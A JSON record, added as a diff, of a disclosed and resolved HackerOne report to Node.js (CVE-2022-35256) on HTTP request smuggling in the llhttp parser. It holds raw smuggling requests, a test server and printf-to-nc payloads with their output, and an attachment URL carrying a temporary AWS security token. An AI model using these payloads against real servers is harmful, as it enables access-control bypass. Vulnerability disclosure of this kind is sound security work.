@@ -1,0 +1,194 @@
+{
+  "id": 1675191,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjc1MTkx",
+  "url": "https://hackerone.com/reports/1675191",
+  "title": "HTTP Request Smuggling Due to Incorrect Parsing of Header Fields",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-20T03:13:30.448Z",
+  "submitted_at": "2022-08-20T03:13:30.523Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vvx7",
+    "url": "/vvx7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bbv64gp7idz3ugwd7gidfhbjqds2/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-35256"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-10-26T08:17:59.080Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-09-26T08:17:52.067Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nThe `llhttp` parser in the `http` module in Node v18.7.0 does not correctly handle header fields that are not terminated with CLRF. This may result in HTTP Request Smuggling.\n\n**Description:** \nThe following chunked request is processed.  It should be rejected as `Transfer-Encoding` header obfuscation may result in HRS when the upstream proxy does not process the `Transfer-Encoding` header.\n\nA header that precedes the `Transfer-Encoding`, contains an empty value, and is not properly delimited with CLRF may be used for TE obfuscation. \n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\nThe request is rejected when the preceding header has a value but improper CLRF.\n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:x\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\n## Steps To Reproduce:\n\nServer\nRun the server: `node app.js`\n\n```js\n// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/\nconst http = require('http');\n\nhttp.createServer((request, response) => {\n  let body = [];\n  request.on('error', (err) => {\n    response.end(\"Request Error: \" + err)\n  }).on('data', (chunk) => {\n        body.push(chunk);\n  }).on('end', () => {\n    body = Buffer.concat(body).toString();\n\n    // log the body to stdout to catch the smuggled request\n    console.log(\"Response\");\n    console.log(request.headers);\n    console.log(body);\n    console.log(\"---\");\n\n    response.on('error', (err) => {\n      // log the body to stdout to catch the smuggled request\n        response.end(\"Response Error: \" + err)\n    });\n\n    response.end(\"Body length: \" + body.length.toString() + \" Body: \" + body);\n  });\n}).listen(5000);\n```\nPayload\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" x:\\nTransfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nOutput\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 02:59:38 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\n```\nNote:\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" Transfer-Encoding: yeet\\r\\n\"\\\n\" Transfer-Encoding: \\n\"\\\n\" Transfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nThis also works with the resulting wonky header:\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 03:06:09 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\nResponse\n{ host: 'localhost:5000', 'transfer-encoding': 'yeet, , chunked' }\nA\n```\n\n## Impact:\n\nHRS can lead to access control bypass and other issues.\n\n## Supporting Material/References:\n{F1875064}\n\n\nhttps://hackerone.com/reports/1501679\nhttps://hackerone.com/reports/1238709\n\n## Impact\n\nHTTP Request Smuggling can lead to access control bypass.",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1875062,
+      "file_name": "CleanShot_2022-08-19_at_23.09.24.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/85anhamky7182hac48d4ssjopg7m?response-content-disposition=attachment%3B%20filename%3D%22CleanShot_2022-08-19_at_23.09.24.png%22%3B%20filename%2A%3DUTF-8%27%27CleanShot_2022-08-19_at_23.09.24.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQXTSGMXA%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050357Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJHMEUCIGFnIW2WUNn0x8hbPRY7oM22sw2Xm7S8%2B2D4mwS%2FeMhgAiEA0J6C62JkkmUMjkD7XdMGI3f2HY0KtlrFYbLsAtwkz3EqsQUIBhADGgwwMTM2MTkyNzQ4NDkiDE37GMXipvlz%2BYZxGiqOBW6ANRH7yJYNML5ebQKtTtJdnIBt1BmM8W9WUDXdlqwW983G6e9i4MdLSFzrg%2BCp8yZNwWZKYxRfLHv0ge4duHwhOLdrOvaGMy3kmDQ86Yt90%2BTavwFIsqyXD6urS7v3wKkV6UORmn8g6I2wnxcgA4Pb2nmOkAqqcObU8G7XPVIvd7C3jcm1%2FkUS6SYJjkP%2FbfHHxnJJn22VXobGDC4tWxX4%2Bpygp5%2BG%2BlK4W8kS89kFQQuFIcmnMlDreEW51oWftyaBeBu9TP6tpZIbTO3s1Wn8vcA8nW9Qk1sZgkqAJPQj820q7ssM5ECrcZPHYoA38QU40XnCdZIBa%2Fg5oJycOAfLwo5QmkYDrNOuIJqZbnpRrSjg9%2FA9hwE7gp9GUo40et3G0SolHv6B8JUmJonL%2Fcl4B8wih6fSQJ7nURMySpCm%2FQXZ9cuFQ1iqZwXWIEnO%2FVK38KIkAATJ4TokkRzd62LibGmC3UuIQhlWvsms4XtJPY6bN1TGtZp5zEAPXKWIiYL1FEJXtDdV99iW4XhRIvWKE1H8ZB%2BLQa72x2VyQQy9ppEwkpK8MeCxy%2F4mYFNevexuklfKt44GhgzJRIbM8Pt9lLM%2FjPbib5U%2Fy4hp1Hh9laP2tUm2RDMRvMWHyDQ1E0lvD6fJMZ%2FXTP8h6%2FtJkGwqNEjtmAZj4FT2v4NB3%2FzsztwMF08ZuawOOXOMVQS2NIQdJalmuCy2gEvQlNuG5zo8M7wUxbXGC%2FUeL9GJoilPY1KQ8pvAa%2FAJdRZGkIJVWaBRtuDusHGPkCbTDd66BIcXknaN89qx95QUlF2T5LWxtnDeAnDls8ulVp%2BF3CWlpkiKBX%2FKdKOcIm8jWrig9E%2FDxWREdrLcaDDgX6mJ8jDygp3SBjqxAa25fZoiZ1poW6rQF1qqHTBhhfKF8oXlHmDwLsDv8O4D%2F5pFXrDTNh3B1cSqkbmp0gQEXbP%2BHtWcpsrwL4DCDWGbyWv5MlnQ7CgyLOFdRZV68LBwXx6TVv5xRA3Eb6Iz2396IhKLqoKpPIsuAkf5xZf92WiLhISIzh36mTJot1RIM027QKp5QgJ9PN58jmIQW8tdUOvTLoPo3D23Wx7CLs5bvHtqQR6VdqiBODVuyj1Klg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=478e6548981ac231a8abb1aea8006669c51097cdb886433875fca47de730704c",
+      "file_size": 195811,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-10-26T08:17:52.185Z",
+  "allow_singular_disclosure_after": -116282765.59370992,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "shreyaschavhan",
+    "ttmachine",
+    "shivammusic",
+    "cyb3rkid4u",
+    "fatalis",
+    "azdpsi"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1675191",
+  "votes": 6,
+  "latest_disclosable_activity_at": "2022-10-26T08:17:59.313Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:03:57.978129",
+    "source": "https://hackerone.com/reports/1675191.json",
+    "report_id": 1675191
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjc1MTkx",
+    "databaseId": "1675191",
+    "title": "HTTP Request Smuggling Due to Incorrect Parsing of Header Fields",
+    "url": "https://hackerone.com/reports/1675191",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-10-26T08:17:59.080Z",
+    "created_at": "2022-08-20T03:13:30.448Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzg2",
+      "name": "HTTP Request Smuggling",
+      "external_id": "cwe-444"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "vvx7"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIyOTg0",
+      "handle": "nodejs",
+      "name": "Node.js",
+      "url": "https://hackerone.com/nodejs",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE2NzUxOTE=",
+    "_id": "1675191",
+    "disclosed": true,
+    "votes": 6,
+    "latest_disclosable_activity_at": "2022-10-26T08:17:59.313Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjc1MTkx",
+      "databaseId": "1675191",
+      "title": "HTTP Request Smuggling Due to Incorrect Parsing of Header Fields",
+      "url": "https://hackerone.com/reports/1675191",
+      "disclosed_at": "2022-10-26T08:17:59.080Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIyOTg0",
+      "handle": "nodejs",
+      "name": "Node.js",
+      "url": "https://hackerone.com/nodejs",
+      "currency": "usd"
+    }
+  }
+}
